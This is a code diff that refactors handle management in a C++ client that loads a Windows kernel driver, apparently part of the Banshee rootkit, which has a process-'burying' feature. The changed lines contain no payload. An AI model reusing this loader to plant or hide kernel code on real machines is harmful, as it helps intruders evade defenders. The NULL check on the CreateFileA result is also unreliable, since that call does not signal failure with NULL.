@@ -63,7 +63,7 @@ private:
 
     SC_HANDLE hSCManager = NULL;
     SC_HANDLE hService = NULL;
-    HANDLE hDevice = NULL; // driver handle
+    HANDLE hDevice = NULL; 
     std::string driverPath;
 
 public:
@@ -124,11 +124,7 @@ public:
     BANSHEE_STATUS
     Unload()
     {
-        // Close handles
-        if (this->hSCManager)
-        {
-            CloseServiceHandle(this->hSCManager);
-        }
+        // Close device handle
         if (this->hDevice)
         {
             CloseHandle(this->hDevice);
@@ -136,15 +132,21 @@ public:
 
         if (this->hService)
         {
-            // Stop the driver
-            SERVICE_STATUS ss;
-            ControlService(this->hService, SERVICE_CONTROL_STOP, &ss);
-
             // Delete the service
             DeleteService(this->hService);
 
+            // Stop the service
+            SERVICE_STATUS ss;
+            ControlService(this->hService, SERVICE_CONTROL_STOP, &ss);
+
             // Close handle
             CloseServiceHandle(this->hService);
+        }
+
+        // Close service manager handle
+        if (this->hSCManager)
+        {
+            CloseServiceHandle(this->hSCManager);
         }
 
         return BE_SUCCESS;
@@ -189,7 +191,7 @@ public:
         DWORD dwBytesReturned = 0;
 
         // Convert to wchar*
-        int wchars_num = MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, NULL, 0);
+        INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, NULL, 0);
         wchar_t* wsProcessToBury = new wchar_t[wchars_num];
         MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, wsProcessToBury, wchars_num);
   
@@ -329,27 +331,35 @@ public:
 private:
     bool InstallDriver(const std::string& driverPath)
     {
-        this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-        if (!hSCManager)
+        // Prevent handle leaks
+        if (!this->hSCManager)
         {
-            return false;
+            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+            if (!hSCManager)
+            {
+                return false;
+            }
         }
 
-        this->hService = CreateServiceA(
-            hSCManager,
-            this->serviceName.c_str(),
-            this->serviceDescription.c_str(),
-            SERVICE_START | DELETE | SERVICE_STOP,
-            SERVICE_KERNEL_DRIVER,
-            SERVICE_DEMAND_START, // do not start on boot
-            SERVICE_ERROR_IGNORE,
-            driverPath.c_str(),
-            NULL, NULL, NULL, NULL, NULL
-        );
-
-        if (!this->hService && GetLastError() != 1073) // Already exists
+        // Prevent handle leaks
+        if (!this->hService)
         {
-            return false;
+            this->hService = CreateServiceA(
+                hSCManager,
+                this->serviceName.c_str(),
+                this->serviceDescription.c_str(),
+                SERVICE_START | DELETE | SERVICE_STOP,
+                SERVICE_KERNEL_DRIVER,
+                SERVICE_DEMAND_START, // do not start on boot
+                SERVICE_ERROR_IGNORE,
+                driverPath.c_str(),
+                NULL, NULL, NULL, NULL, NULL
+            );
+
+            if (!this->hService && GetLastError() != 1073) // Already exists
+            {
+                return false;
+            }
         }
 
         return true;
@@ -357,21 +367,28 @@ private:
 
     bool StartDriver()
     {
-        this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-        if (!hSCManager)
+        // Prevent handle leaks
+        if (!this->hSCManager)
         {
-            return false;
+            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+            if (!hSCManager)
+            {
+                return false;
+            }
         }
 
-        this->hService = OpenServiceA(
-            this->hSCManager,
-            this->serviceName.c_str(),
-            SERVICE_START | DELETE | SERVICE_STOP
-        );
-
+        // Prevent handle leaks
         if (!this->hService)
         {
-            return false;
+            this->hService = OpenServiceA(
+                this->hSCManager,
+                this->serviceName.c_str(),
+                SERVICE_START | DELETE | SERVICE_STOP
+            );
+            if (!this->hService)
+            {
+                return false;
+            }
         }
 
         if (StartService(this->hService, 0, NULL) == 0)
@@ -382,11 +399,16 @@ private:
             }
         }
 
-        this->hDevice = CreateFileA(this->deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        // Prevent handle leaks
         if (!this->hDevice)
         {
-            return false;
+            this->hDevice = CreateFileA(this->deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            if (!this->hDevice)
+            {
+                return false;
+            }
         }
+        
 
         return true;
     }
